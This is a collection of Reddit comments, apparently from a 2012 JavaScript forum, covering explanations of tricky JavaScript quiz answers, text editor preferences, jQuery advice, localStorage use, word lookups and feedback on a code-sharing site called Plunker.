I'm sorry, but I don't see how you arrive at that conclusion. In Windows the File Dialog function is System.Windows.Forms.[OpenFileDialog](http://msdn.microsoft.com/en-us/library/system.windows.forms.openfiledialog.aspx), while the file access is [ReadFile](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365467\(v=vs.85\).aspx); The former can provide a callback you can use to access the latter, but being able to run [ShowDialog](http://msdn.microsoft.com/en-us/library/e61ft40c.aspx) will not perform any file operations unless the user explicitly allows them. There are no ways to open files outside of this one event handler, so you do not get to open any files you want. The most you could do is make it so a file dialog opened on a given file, but the user still needs to click the "Open" function to expose the file to the page. Similarly, in QT the File Dialog class is [QFileDialog](http://qt-project.org/doc/qt-4.8/QFileDialog.html), while the file access class is [QFile](http://qt-project.org/doc/qt-4.8/QFile.html). As you may notice, the QFileDialog returns nothing more than a list of strings. These strings then determine what files can be opened. If a user did not select a file and click "Open" then QFile can do nothing. Finally, GTK has the [File Chooser](http://developer.gnome.org/gtk/2.24/GtkFileChooserDialog.html). Again, this offers a callback to run when a file has actually been selected, but this implies that the user actually clicked on the file and selected open. Nothing about this API exposes any underlying file functionality to the user. In other words, I don't see how opening a file dialog automatically, by calling something like fileInput.trigger('click') would in any way imply you being able to trigger a file upload, be it in an email, or on any other webpage. Again, literally the only thing this would do is remove a single physical click from the equation; everything else would behave identical to how it works right now.
Sublime is nice but you might also like [this text editor](http://etherpad.org). 
&gt; That's just stupid. Stupidity is in the eye of the beholder it seems. The votes certainly disagree with you.
&gt; It's written and maintained by a single developer This is actually not an endorsement. Mad props to the creator for making this on his own. But when buying software the idea that the whole future is dependent on one guy is not optimal ( [bus factor](http://en.wikipedia.org/wiki/Bus_factor) ). Just look at textmate and the long disappearance of its author
Oh ok. I'm actually blown away by Sublime's performance. I notice no difference between navigating, moving chunks of text around, etc. in large files in OS X 10.7 with 4GBs of RAM and an Ubuntu VM running on ~1GB of RAM. Serious kudos the the Sublime team!
&gt; You've got 10 answers wrong (#1, #2, #3, #5, #6, #7, #9, #12, #13, #14). &gt; &gt; That's more than a half :( I can't help but think ["wat"](https://www.destroyallsoftware.com/talks/wat), if the correct answers are so non-obvious. 
dumb question: I installed Sublime CodeIntel and have no idea what it is supposed to be doing... nothing seems different. can you clue me in a bit?
You've got 12 answers wrong (#2, #3, #4, #5, #6, #7, #8, #9, #11, #12, #13, #14). That's more than a half :(
yea, author needs to change default config... who needs smooth surfing on source codes?
Thank you for sharing that video - it is some consolation to my abject failure in this JS quiz. I can't help but think if you're trying to do things similar to the quiz questions in javascript, you probably should be using a different tool altogether...
Only 12? Amateur! Make mine a baker's dozen. Confidence - destroyed. Drawing board - revisited.
Can someone explain #12 for me. I can't comprehend how that works. 
 (function f(){ function f(){ return 1; } return f(); function f(){ return 2; } })(); The wrapping function f() is eval'd in parentheses and executed via the final parentheses. Inside that function, two more function f()'s are declared. (Note the difference between declaration and assignment- declaration happens **prior** to execution, so the second function f() is returned, even though it was declared after the return statement. So the answer is 2, since that f() overwrote the first f() which returns 1. Example function declaration, so that declared() is available at beginning of the code execution on line 1. declared(); // returns true function declared(){ return true; } Example function assignment- assigned() is not available until it's actually assigned on line 2. assigned(); // throws a TypeError: 'undefined' is not a function var assigned = function(){ return true; } For more on the key concept here, read [function declaration vs. function expressions](http://javascriptweblog.wordpress.com/2010/07/06/function-declarations-vs-function-expressions/).
I got 3 wrong. Man, you guys suck! (I keed, I keed!) As a consolation to those of you who had pretty low scores, consider this: With a modicum of experience, you automatically avoid most of the dark corners of JavaScript. So it isn't that you didn't know that these potentially bug-causing constructs existed as much as you would never actually *use* them. As a result, without much experience utilizing these constructs, you don't know what values they produce but you do know that they are *bad* and often that is plenty good enough.
And TextMate works just as well now as it did in 2006: superawesomely
Someone asked a question but deleted it while I was answering it. I'm not about to throw away my answer so here it is. Question: &gt; I don't know how to think about #6 and #9, can someone help me? Answer: &gt; 6. &gt; &gt; var foo = { &gt; bar: function() { return this.baz; }, &gt; baz: 1 &gt; }; &gt; (function(){ &gt; return typeof arguments[0](); &gt; })(foo.bar); &gt; This is the same as question 7 but phrased differently. There is a difference between calling a function and using a property lookup notation to call a function attached to an object, as a method with `this` pointing at the object. // f is just a function, no association with foo var f = foo.bar f() // this !== foo // or simply (foo.bar)() // this !== foo // bar is a method on foo foo.bar() // this === foo foo['bar']() // this === foo If you are familiar w/ the concept of bound and unbound methods, a la Python and Ruby, this is what's at play here. If you just grab a function from some object it is not bound to that object anymore. It is an unbound method, or a plain old function. In ES5 and later, or when using something like Prototype, you can use Function.prototype.bind to bind `this` to something and thus have a bound method. e.g. var f = foo.bar.bind(foo) f() // this === foo When `foo.bar` is passed to the function it's just a regular anonymous method, semantically equivalent to this: (function() { return typeof arguments[0]() }(function() { return this.baz })) &gt; 9. &gt; &gt; var x = 1; &gt; if (function f(){}) { &gt; x += typeof f; &gt; } &gt; x; &gt; First I'll write it more clearly. var x = 1, condition = function f(){} if (condition) { x += typeof f } x The first thing to note is that when you name a function expression its name is only visible inside the function itself. So inside the `condition` function `f === condition` but outside the function `f` is not defined. var g = function f() { console.log('f: ' + f) console.log('f === g ? ' + (f === g)) } g() // f: [object Function] // f === g ? true console.log(f) // ReferenceError If `condition` is "truthy" the if block executes. Truthy values are all non-falsy values. Anything except null, undefined, 0, "", and of course false. `condition` is a function so it is truthy. So the `if` block executes and we append `typeof f` to x. `typeof f` returns `"undefined"` because `f` is not defined outside of itself. When you add a string to a number you get a string so `x` ends up with the value `"1undefined"`.
Sorry about deleting my comment, I had learned how to answer them so I deleted my question so as to not bother others. Thank you for your efforts, they are well appreciated!
webkit is not and was not ever "apple's"... they were heavily involved with its creation, but it's not theirs. it's open source and it's been the rendering engine behind both Chrome and Safari for some time now.
I get what you mean about how providing answers only using jQuery gets in the way of full understanding, but I think an important part of programming productivity comes from being able to work using an abstracted API without having to handle various details (so long as the abstraction works well). I don't evangelize jQuery as the only way of doing things, but the question asked for 'Can someone suggest a simple and easy way to do this' rather than a way that provides them with a full understanding of what is happening on a lower level. Also, using jQuery to do something and then following what the source code does provides a deeper understanding.
I got 7 out of 12. Can someone explain #3, #13 and #14 to me?
So is vim. And it's free and open source. With more features. 
aka "`typeof`: the Quiz" Not that there aren't some principles being quizzed on here, but I'm just saying, I haven't used `typeof` in years. Plus, some of these are written not to test your knowledge, but to trick you, e.g.: (function(foo){ return typeof foo.bar; })({ foo: { bar: 1 } }); This one is about misleading variable names, not javascript. 
Your text editor should be an extension of your hands. You want a tool to always work and hopefully be maintained. &gt; if it works for you today, who cares about its "future"? When you have a bunch of extensions that you rely on to make your job easier/faster/awesomer, you'll care. TextMate is a perfect example of this, it's no longer maintained and as a result many people have jumped ship. Some have left to Sublime, but many others to others like emacs and vim.
I never said anything about cost. It's about licensing. (Licensing and cost are not the same thing, although they often go hand in hand). When it comes to patent encumbered h.264, the freedom to use it commercially without facing a lawsuit is unlikely, and to use it personally after 2015 is currently ambiguous. Also generally if it's patented, it's probably not open source. I may be off here, but I'm pretty sure h.264 doesn't fall under any sort of freedom to distribute license. 
 #3 -- 'g' doesn't exist as a global function when its assigned to a variable in the same statement, so it raises an error when you try to call it as a function. #13 -- what 'function f()' returns is what is returned by using 'new f()' too. Which in this case is simply a reference to the constructor 'function f()' rather than an instance. Therefore it's an 'instanceof Function', not an 'instanceof f' #14 -- 'with' sort of scopes values with an object. So var x = {foo: 'bar'}; with (x) { alert(foo) // alerts 'bar' } And the 'length' property of a function referes to the number of arguments it uses. Which in this case is 2. Also, never use 'with'. It can't be optimised by the browser, and makes things ambiguous.
First of all, don't edit *redips-drag-min.js* that is just making your life more difficult that it need be. If you really have to edit the library itself, then edit *redips-drag.js* and regenerate the minimized file with uglify-js, yui compressor, or similar. Second, the place you want to edit is in *script.js* where the fuction *rd.myhandler_dropped* is defined. Third, the *rd* object has properties that represent the drop location and the dropped element. When in doubt, add a "console.log(rd);" somewhere inside that function to see what it contains. An object's property names are usually pretty self explanatory. Finally, what you want is the "obj" property within the "rd" object in that handler function. Right after "num++;" add the lines: rd.obj.style.background = 'red'; rd.obj.style.color = 'white'; 
You rock! Thanks so much for the help, that worked perfect. I have 1 more question. How would I change things like font-size? I tried font-size and fontsize but neither worked. However, I am guessing it's because I'm not targeting the &lt;p&gt;? How would I change that text "Green" to change to 24px on drop and possibly move with margin-top or something? *Edit, I'm sorry. To clarify, I have implemented this in another environment, and inside of the draggable object I have a &lt;p&gt; which I am trying to change the color and font size. I guess my ultimate question is that this... rd.obj.p.style.color = 'white'; Did not seem to change anything. Is there another way to target that inside &lt;p&gt;? Thanks.
That's just fine. I have my workflow down and it works for me. 
* Not being able to define properties seems like a serious weakness. Looking at your code, producing `&lt;img src="http://..."/&gt;` would be done with `create('img', function(e){e.setAttribute('src', 'http://...');})`, a prime example of the kind of boilerplate I wanted to remove. * That's probably something of a philosophy diference. I see 2 main uses for passing the functions in your code: 1) Generating other tags: That is not significantly different from generating the objects before calling create/buildHTML. 2) Working around not being able set important properties like `id`, `src`, `name`, or `type`. * Excellent idea, it was only a 3 line change.
No, that's not necessary, ddom will map in any properties which aren't considered special directly, i.e.: _dd.create('img', {src: 'http://'}); The key is the $.extend on the final line of create. :) Edit: Worth noting that the example on the README depends on this behaviour to map in 'href' of the link :)
Ahh I see, that works. Last question: How do I go about targeting other things? Example, if I have a &lt;p&gt; tag inside the draggable box, how do I target the &lt;p&gt;. Or, if I have a div that is on the outside of that draggable box, how do I go about targeting that div instead?
I see now that that would work, I read it thinking it would just add data properties (useful in their own way, but setting attributes is *much* more important).
Wow, that is confusing for something so simple in pure css. Thanks so much though! You've helped me a ton in the direction I need to do! I am going to attempt to target a div above in a minute here.
I don't see how yours will be any more efficient. Most of the cost is from the calls to Math (which in many, but not all browsers, is just seen as an non-optimizable black box during optimizations). If you want to go faster, you could force the value to be converted into an integer, which is fastest with a bitwise-or or right shift. This will stip off the decimals, and so has the effect of ceil for positive numbers. (( Math.random()*n ) | 0) + 1 Although bitwise-or is significantly faster, Math.ceil and Math.floor are far from slow!
Javascript 101 from imbcmdth. You rock, thanks again!
Javascript: The Missing Manual, just because it was the most recent edition in my library (it's from 2009 and all the others are pre-2000). I'm also doing the whole codecademy thing, though I'm getting pretty frustrated with their pacing.
You only need a very basic knowledge of JS to be able to write most common jQuery code. That is why it is such an awesome library. I have known plenty of productive web developers who only know bits of syntax, and not what is actually going on. Most websites only ever perform AJAX, finding elements, changing classes, altering styles, inserting new elements, animations, and listening to user events. All of those are trivial with jQuery, with very little knowledge of JS. So personally I would advise going down that route first. It will get you comfortable with jQuery, and give you somewhere to build on for when you start learning more about JS. The other advantage is that lots of new developers spend weeks trying to work with the DOM, or XMLHttpRequest, which are some of the worst bits of JavaScript. Ugly APIs, with a mass of subtle browser differences. jQuery allows you to avoid that agony, and for most projects you rarely need to touch it directly (at least not heavily). You are right that if you want to start writing advanced JavaScript then you need to know much then just some jQuery. However you can learn that later as you start building more advanced websites.
As spamhammer alludes to (but to which he gives the wrong results), the distributions will in fact be different. First, we note that Math.random() returns values in the range of [0,1). That means it includes 0, but doesn't include 1. See [here](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Math/random). The first expression thus gives you values in the range [1, n) with a uniform distribution. So it includes 1, but not n. The second expression (yours) gives you values in that same range of [1,n) plus an additional, almost infinitesimally small chance to get a value of 0. Think about it: if Math.random() returns 0, multiplying by n also gives 0. Then taking the ceiling of that value still gives you 0. This is probably why the books give you the first expression. So no, the two expressions are not equivalent, and the first one is the correct one you want to use.
They're not equivalent. What if Math.random() returns 0? The second expression will return 0, when in actuality 0 may not be an allowed value.
This quiz would be a lot better if it fucking **explained the answers** after crushing you with failure.
Questions like this are why certs are meaningless. Any good programmer would never encounter these situations.
&gt; When you have a bunch of extensions that you rely on to make your job easier/faster/awesomer, you'll care. so you're suggesting I don't know what it's like to rely on tools for my job? I do. The ones that work don't require constant updates and triage. They work now and will continue to work for the foreseeable future - active development or not.
If anyone I worked with actually wrote code like that, I'd shoot them.
Not to mention they are not cross-browser compatible. For example on question #9 Chrome returns "1function", while they count "1undefined" as the correct answer.
Consider using photoshop to create an svg image (or just use [the ones on wikipedia](http://en.wikipedia.org/wiki/Wikipedia:Blank_maps)) - where each of the countries are regions in the svg. Then you can just use the css `:hover` to highlight each when you mouse over them. [Here's an example using Africa](http://rampion.github.com/africa.html). 
I'm sure someone else has stated that if you know the answers to this, great, but if you ever use any of this in code I have to maintain, I will kill you.
I pushed [something with a similar goal](https://github.com/pdehn/ckdom) to github a couple of days ago. Based on [CoffeeKup](http://coffeekup.org/) / [ck](https://github.com/aeosynth/ck), but only for the browser and it creates a DocumentFragment rather than a string of html.
to better explain the document I have here is a picture of what it looks like with a word highlighted. http://imgur.com/63Z8s
Thanks, I'm using poly shapes. My prob is more that when the image appears it's not appearing in the right spot despite positioning and it's also flickering. I'll try SVG. :)
So, if I play unrealisticallyunrealityunrealizable that's a valid word? You need some kind of delimiter in that or this will never work. Then put it in a database and use an AJAX call to check if the word exists.
and OP, if you format your code by prefixing each line with four spaces, it'll make it much more legible for folks like me and ump721 to read. Like so: #bkgndimg { position:absolute; left:0px; top:0px; }
I have a hunch that it does have a new-line delimiter but Notepad doesn't understand Unix style line breaks so it *looks* like one long string.
&gt; so it's back to good ol' W3schools That is your first mistake.
SVG won't work in older IE &lt; 9 and doesn't work on Android's default browser before Ice Cream Sandwich because Google's Android team is fucking brain-damaged.
Well, you're going to need some sort of delimiter between words. You'll either have to edit the current dictionary or roll your own. I mean, you could do a linear search through the document each time, but the worst case time could be unacceptable depending on the number of words you have.
[Raphael JS](http://www.raphaeljs.com) can help with IE by falling back to VML. Here's a [demo of Australia](http://raphaeljs.com/australia.html)
You mentioned Java, but I am sure you are aware that Chome extensions are written in Javascript; minor detail. Aside from that making extensions is *super* easy and fun. Google has a pretty good tutorial [here](http://code.google.com/chrome/extensions/overview.html) along with a helpful ['hello world' example](http://code.google.com/chrome/extensions/getstarted.html). One of the BIG things I had to learn- I have never taken a CS class- is the [background.html](http://code.google.com/chrome/extensions/messaging.html) page. This is basically how you will pass information(localStorage) to and from your contentscript.js. Other than that, it's just like writing regular ol' Javascript. This might make your life easier [QR code class can be used to generate QR Code images using Google Chart API.](http://webcodingeasy.com/JS-classes/Generate-QR-codes-using-javascript).
Don't tell me! :P But Joel, listen to IrritableGourmet.
Wow I feel stupid now for not knowing this earlier, up-votes all round for this one. Cheers guys, also the other information really helps too
Do you need a custom dictionary list or are you just looking for a reasonable set of real words? If the latter, why not let someone else do the work and use an API (for example http://developer.wordnik.com/) and not both with a list at all. 
what would you recommend instead?
Thanks. I've done that now.
Generally, to get filesystem access from JavaScript, you need to be in an environment like NodeJS or PhoneGap. I don't believe Chrome lets you write arbitrary files to the filesystem.
From the creator of jQuery, and moderator of /r/javascript. http://ejohn.org/blog/javascript-trie-performance-analysis/
I'll have a look, this does seem interesting
*looks up, reloads* You have? Are you sure?
I'm excited to see another comment from you. It was so disappointing when you last said you'd never be commenting again. &gt; join was faster in your first post I never said this. You keep claiming I said things that I didn't. I hope there's cute little leprechauns and unicorns in your fantasy world. &gt; then I was wrong because I never encountered string bottlenecks I didn't say that either, I said your argument was a fallacious appeal to authority, which it was. &gt; I really, really haven't appealed to an authority here, by any stretch of the imagination: I'm sure you don't think you have; your reading comprehension was poor enough for you to think I was claiming join was an optimization, as you already asserted more than once, so it's unlikely that you read the Wikipedia article or understand what an argument from authority even is. &gt; I had a PhD in Argumentology look my arguments over and he says they check out There's another argument from authority! Unfortunately "my pal says they check out" is just as bad an argument as your previous one was. You should get your friend with a PhD in Mixology and Gemology to help out, too. &gt; choosing between different language features based on speed should be measured objectively. Even if this wasn't just you repeating a well known adage, it's certainly not what you originally said. &gt; using one's own experience and reasoned argument is not "appeal to authority", lest everything anyone's ever said be deemed fallacious. If you had only talked about your experience it would not be an appeal to authority. It's when you used it as a reason to support your other statement that it became an appeal to authority. You might be able to see this if you actually read the Wikipedia article. Of course it's hard for you to recognize something you don't even understand. &gt; taking something like this so seriously and being irrational over it in order to "win" is a sign of distress or conflict that I wish you can get help with You seem to be taking it at least as seriously as I am, to the point that you said you'd wouldn't ever post on this thread again, and then you couldn't resist and posted again. I'm just pointing out how dumb your arguments are. I think my biggest problem is that I might need something more entertaining to do. &gt; if you've assumed that I'm being the average internet jerk and that you have to save face against anything I've said, I assure you that is not the case. I might worry about saving face, but you haven't actually made a sound argument or pointed out anything factually wrong with what I have said. Should I really be worried that someone who's posting as much as I am is saying I need help and therapy for posting too much? &gt; I don't mind the specifics of Yeah, someone who's wrong usually doesn't like to be bothered with exact details. 
Be sure to read the subsequent posts too, http://ejohn.org/blog/revised-javascript-dictionary-search/ I used Randall/Mathias Nater's method and it worked well (sub 50ms word search time and quick parsing for the browser). It just needed a build process to generate the JavaScript dictionary files which I wrote in Python 3.
I think that JS is good because it is easy to see the results (almost) instantly, and it runs the most places. Now if only we had an actual direct manipulation IDE like Bret Victor's https://vimeo.com/36579366 (2:30) ... that would be great for teaching.
Nope, but you could save the data to localStorage, and then write something to zip up all of the data (zip libraries exist in javascript) and export it.
See how my codeblock: fibs :: Num a =&gt; [a] fibs = 1 : 1 : zipWith (+) fibs (tail fibs) Is slightly indented, and the font is `fixed width`? Don't separate each line with four spaces. Indent each line by four spaces. See the formatting help section.
loadPage is fictional, so yeah it would throw a reference error if executed without actually implementing it.
What about a command-line javascript runtime like node?
 function checkWord(allwordsstring, word) { return ( allwordsstring.indexOf(word) &gt;= 0 ); }
&gt; claims to have tiny library Requires 30kb of trollQuery code.
That just does a linear search. It's not intended to do a fast lookup over a huge string.
this is awesome. I think I will try to implement it in jsMaker...
&gt; This one is about misleading variable names, not javascript. I think the point is being able to grok the nuances of how JS handles these things, by virtue of being able to mentally interpret these commands and parse out the result. I won't argue the relative merits of this particular question, but suffice it to say that I _do_ believe it can be used to separate out those who're more versed in JS vs. those who aren't, which is what I believe the ultimate goal of the quiz is.
They all become obvious if you [deconstruct them](http://www.reddit.com/r/javascript/comments/qfzq5/think_you_know_js_take_this_quiz_and_prove_it_two/c3xcj7i).
Using Node solves the DOM/CSS issue, but it still leave a lot of baggage around function scope and callbacks, so it gets closer to the issues Resig raised in his original post. My beginners have enough trouble already with writing functions and keeping the value of "this" straight. I love JavaScript, but I think it's a lot easier to teach/learn in a synchronous language that doesn't require http.createserver() to get started.
In fact, if you have some kind of background in game or canvas application development prior to HTML, you'll find it quite familiar and easy. Main differences (depending on your background of course) are : - no need for double-buffering to avoid flickering as the engine draws only when your code returns (your code is monothreaded) - interesting path functions - good quality drawing with native antialiasing - slower than most C canvas but still faster than you think
I see a lot of potential for this.. possibly streamlining javascript game dev and mvc stuff
Verified. Controls suck ass. Runs great in Chrome.
It's a motion sensing controller for the Xbox 360, you can capture 3D and track human skeletons with it.
I don't like the notion that you can violate the intention of the technology. I like it when technology works to a specification and how you utilize that technology is up to you. As long as you don't violate the specification it should work. The alternative is to only do things intended by the technology. That restricts you to doing only things that have been imagined by those who define the standards. People would like Web standards to become a platform that extends beyond the web. That simply cannot be done if people are restricted to using the technology according to how it was expected. Something that goes in conjunction with that view is the idea that specifications should be simple and powerful. I have placed a pseudo-operating system into localStorage. You can run (and even develop) apps from within the locally stored data without needing to talk to a server. It is one thing to claim that I shouldn't be doing that with localStorage, but I know of no other way to achieve the same persistent local data mechanism. I reject the notion that I shouldn't be doing this at all. It should never be the prerogative of an open platform to say what you can or cannot try to implement. 
Please, don't desert it:). But hey, c'mon, I can't steal a car. I prefer orginal GTA/GTA2 stearing and futures...
Never mind. :-) Actually, this makes me think... why can't the browser vendors choose a standard library (e.g. jQuery) and incorporate it into their codebase as a de facto standard? We could see native performance with a common DOM and JavaScript interface.
&gt;However your script will reject valid filenames such as my.image.jpeg. I'm aware of that, and I included that in the readme. This script is really just for my boss to process photos before she puts them into our database. So that doesn't bother me. &gt;Also there are a lot of 'magic' numbers I think you would do well to replace with constants. Any reason you didn't write it as a class? Good idea! I wrote this before I knew much about OOP in javascript so maybe that's a reason to go back and re-write this instead of leaving it procedural. &gt;How does Photoshop deal with scope bleed? No idea. This is the only thing I've written for it and it went through about 300 high-res photos with no problem. 
You read or write from the DOM with string literals using the innerHTML or less common outerHTML methods. You can then store this data directly in localStorage. As long as it is just a string literal you can put it in localStorage. If you are receiving data from a JSON or XML feed that has using in a single page of a single session then I would not bother storing this at all. Otherwise, for storing data fragments I just put the data together in some simple and unique way and parse it out using custom code. JSON.parse is probably more efficient to process and write against for large data sets, but when I know exactly what the keys are and if there are not many my custom way probably fits the needs of my application more directly. I created an incomplete GUI/desktop environment that saves state using localStorage. Try it out at the following link and then refreshing the page or closing the page and then coming back. Please advised that it is incomplete though. http://prettydiff.com/jsgui/ In my experience localStorage is far faster than using cookies. Cookies have to be requested and then they have to be parsed. LocalStorage is automatically available as some extraneous DOM object outside the document node.
I don't use Fireworks, but [looks like it](http://help.adobe.com/en_US/fireworks/cs/extend/index.html) Their documentation for Photoshop was pretty good, this looks better
&gt; I don't like the notion that you can violate the intention of the technology. It is limited to storing string literals only, so by default it is extremely restrictive. If somebody really, and I do mean REALLY, wants to violate that restriction then I am sure they will find a way. &gt; It is one thing to claim that I shouldn't be doing that with localStorage, but I know of no other way to achieve the same persistent local data mechanism. I reject the notion that I shouldn't be doing this at all. It should never be the prerogative of an open platform to say what you can or cannot try to implement. I have not seen your code, so I cannot speak to it. All I can say for application efficiency is to treat localStorage the way windows applications treat the registry: bind configuration data facets to keys but never store logic.
Okay, so to rephrase, you're talking about reading something from the dom to hang on to it for later, or to write back to the dom to display data. Assuming I understood that correctly, why in your first post compare times of writing strings to the dom against writing strings to localStorage? Or should I have read it has 'like writing strings to the dom, writing small strings to localStorage is fast, writing large strings is not'? My question about json in localStorage was aimed at how to track non-history page state (settings, last expanded nodes, etc) that needs more than just a set of key/value string pairs. From your elaboration and the article, as long as you read on page load (maybe on change from another tab?) and write on close or settings save, it should be a pretty reasonable system. Thanks for the example page - doesn't seem to play nice with my transformer running android 4.
The point of the first slide (since you aren't hearing the dialog that goes along with the slide) is to demonstrate that it is harder to see missing commas when they are trailing. That's definitely up for debate, but he's not the first one to adopt that style. Some of the later points are interesting too (one line diff, easy to comment out members from object literals, etc)
That's a nice sentiment but I like all the debugging and testing that the community has put into jQuery to make sure the code runs the same across all browsers. Things like handling bizarre, non-standard response codes from IE. There's definitely a time and a place for what Snook is proposing, though.
I see you've been downvoted without explanation. Sorry about that. I would have liked to know why this is not a good idea, but unfortunately the n00bs don't know reddiquete.
(Shameless Plug) You should post this to http://codetique.com people can leave comments in line with the code. Just click the line to leave a comment on it. 
lol, some little used things there though...
How big is the string actually and how many milliseconds does it take? People need to profile before they come up with complex algorithms for optimizing things. Better yet wait until you perceive an actual performance problem without profiling. Its billions of operations per second. Sure its JavaScript.. but lots of times now that is actually compiled to native code using JIT.. and even interpreted code these days is probably a lot faster than you think.
It has nothing to do with XML names. According to that document you linked to, `foo-bar_baz.qux` is a valid XML name. It can obviously not be used as an unquoted property name and/or with dot notation: &lt;http://mothereff.in/js-properties#foo-bar%5fbaz.qux&gt; JSON doesn’t just require quotes, it requires double quotes (`"`). This is mentioned in the article as well, although it’s really a specification on its own.
from readme about BankersBox: &gt; A redis-like wrapper for javascript data storage using localStorage as the default persistent data-store. If you recommend this, I don't think you read the article.
As far as ES5 is concerned, it’s actually valid. You may want to add the quotes for backwards compatibility with ES3, though: http://mothereff.in/js-properties#default
http://chopapp.com/ This is better.
https://github.com/azicchetti/jquerymobile-router https://github.com/lagartoflojo/spine.jqmobile
Why not use underscore.js? Most of this is available there.
Wow, the next time I'm working on a web app that doesn't already include jQuery, Dojo, or something similar, I'll definitely do this. Oh wait, what's that you say? Everyone is already including a general-purpose library, so there's no point in acting superior about the fact that you COULD do the same thing with bare DOM scripting? Hmm....
Ah, thank you! I can actually understand that a bit more with the spaces. Also feel sorta dumb because the redirect remover would be looking for and removing any secondary http or https in a URL which is more complicated than just finding and replacing a string.
I don't think anyone can call the DOM a common interface. This is why we have jQuery/YUI/Dojo/MooTools/etc.
No problem. Almost certainly a better way to do it but it seems to work for me in Chrome. I only tested the [first link](http://www.seasite.niu.edu/khmer/conversation/unit1/unit1.htm) so it might not work site-wide. I'm sure you can tweak it if you have to.
Thanks, I'm not the only one - my initial read of it has led me to believe that either we could compare these details to provide meaningful information about how storage performed, or it was possible to store dom node in local storage. While could potentially be awesome, but on second thought didn't really make a ton of sense.
Oh I didn't realize that existed. Thanks for the tip.
Hi, I'm the creator of Plunker. I'm looking for feedback on the site and for what features I should consider adding. The source is in Github: [Source link](https://github.com/ggoodman/stsh) (MIT) Don't forget to check out the [Landing Page](http://plunker.no.de)! Here's a neat example of what can be done on Plunker, but not on other similar services: **[Slamikaze](http://plunker.no.de/edit/ecEEbA)** Why should you consider Plunker? * Arbitray number of files per *plunk* * Make XHR requests to files in the plunk (think client-side coffee-script, jade, less, etc..) What is planned? * Download a plunk (thanks oatmealsnap) * Resize panels (thanks intravenouscoffee) * ~~Toggle word wrap~~ (thanks hhustlin) * ~~TidyUp feature~~ (thanks hhustlin) * Export to Github gists * Oauth2 login to better interact with github * Voting on plunks * History of own plunks **What else needs to be done to make it better than jsFiddle?**
God I hate gimmicky libraries.
Miscellaneous methods all shoehorned into a single object? Check. Extending native data types? Check. Sorry, but those alone guarantee I'll never give it a second glance.
Thanks for this. I have team members who've been abusing the hell out of `data()` and they are likely making these mistakes. Any tips on effectively communicating that `data()` shouldn't be a generic datastructure within which you can store your application data? I've tried to explain a 1000 times that the "data" should only be related to presentation, but they still end up using `data()` -- when simple JS variables would really be more appropriate.
JSfiddle is dog shit slow and the login doesn't even work. Your page seems faster, but we'll see - can you save plunks? Also, add YUI 3 at least. Update - nice work, I see you can save it. I'll play with it. I love the idea of JSFiddle, but it leaves a lot of intangibles left to be desired. And the devs on the mailing list are not very helpful. Thanks!
Although great suggestions, I'm not sure that those suggestions (with, perhaps, the exception of collaboration) fit in my vision for the project. I want Plunker to try and keep overhead to a minimum on this project. Also, given that I'm just a hobbyist, I'm not sure that I have the skill or time to attack real-time collaboration or intellisense. With respect to multiple programming languages, I think that I will keep Plunker web-centric and client-side for the time being. That being said, the API means that code can be edited and saved in any language and then exported. The limitation is that server-side languages will just not be run.
I might like the ability to resize the frames.
Do you have jstidy/formatting or jslint support planned? Also, some sort of export or download would be really nice.
Here's my feature desires -- I know some have been stated already: -Word wrap -Better frame control than just a dropdown - resizing and splitting would be awesome -vi(m) keybindings? -Live collaboration a la Etherpad (seriously! i know you shot this idea down already but it would be awesome). -JSLint/Hint and a "TidyUp" feature similar to jsfiddle. I use this _all the time_ for cleaning up then analyzing nasty code.
Why post abandoned projects?
BTW, if you want to import and edit arbitrary gists, you can type the address: http://plunker.no.de/edit/from:[GIST ID] Where [GIST ID] is obviously the ID of the gist (even private gists).
Ohai, my name's Marak and I have once again "borrowed" some code that isn't mine, slapped my name on it, and here we fucking are again.
Many Thanks :)
I like the way you can click back and fourth between the files, much better than the panes on jsfiddle.
The current preview approach is actually hacked together really quickly. I think that you are right in that the current approach is maybe a bit heavy (resetting the url of an iframe after 1000ms stoppage in editing). I think what I will do is make a link to toggle full-screen preview quickly and painlessly and prevent the system from making unneeded updates to the iframe src. In other words, live preview will become optional.
Re: modal preview, I originally had this. Unfortunately I found that canvas apps ran really slowly using this approach (28fps vs 60fps). I will make a preview mode that is fullscreen. Can you elaborate on what you mean by pulling code from other plunks? Do you mean to extend the current plunk with libs from other plunks? If so, I like the idea... It could be done by a modal dialog that allows the user to select those files (or all) that should be imported.
Seconding the Vi keybinding request =]
I find @mathias, @kangax and @DmitryBaranovsk to be in a league of their own when it comes to in-depth, thoroughly researched, investigative posts like this one.
Coffeescript support is a must.
http://wtfqrcodes.com/
I love this website! :D so true
"THE OTHER LEFT!!!!"
Done.
Oh, awesome.
I still like JavaScript syntax more. I'm of course biased by the fact I've barely experimented with Ruby and I work with JavaScript, but somehow the JavaScript syntax looks more structured and all the brackets sort of guide your eye to the part you are looking for and tell you much at a glance. While Ruby lacks everything unnecessary and looks very clean, I feel like I have to read the lines from start to end instead of glancing at them to find what I'm looking for. It isn't very apparent in the given example, but when you have a file with a ton of functions, I find JavaScript much easier to read and understand.
Oh I just wasn't sure to which API you were referring. After rereading your post I get it now though.
Better: https://github.com/jeromeetienne/jquery-qrcode Can use bog-standard tables instead of relying on canvas to display QR Codes.
You can also use plain ASCII -- Like: http://www.reddit.com/user/Convenient_QR
bind/live/delegate have all been superseded by [on](http://api.jquery.com/on/)
Looks and works good. But it is congratulations, not congradulations. (:
I'm a web developer who thinks about this kind of stuff all day every day ;) edit: Oh, you'd have to pass in the difficulty in the url too. But the great thing is that this can still be 100% client side!
That was fun, I really enjoyed it. Can I ask you how long it took you to put that together?
A way to write cleaner jquery code in my experience is to not use any (there will ofc be exceptions) anonfunctions as parameters to my jquery selectors. At least for me this made *my* 800 line jquery soup into a readable file.
I tend to use a pattern where I group a particular feature together in a closure. Here is a dumb example: // Dumb Link Alert Module void function () { "use strict" function initialize() { $('.alert-widget').on('click', 'a', function (e) { e.preventDefault() showHrefAlert(this) }) } function showHrefAlert(elem) { var $elem = $(elem) alert($elem.attr('href')) } $(initialize) }() Any thoughts?
Wow this is awesome! I posted it to [HackerNews](http://news.ycombinator.org/item?id=3678380) where it hopefully will get the attention it deserves.
If my team couldn't figure out the difference between a jquery method and core JavaScript functionality (variables). I'd be wondering what other basic 101 programming things they are not aware of and probably start looking to hire people that do.
step one, learn vanilla jscript. 
Really great. Thank you for this.
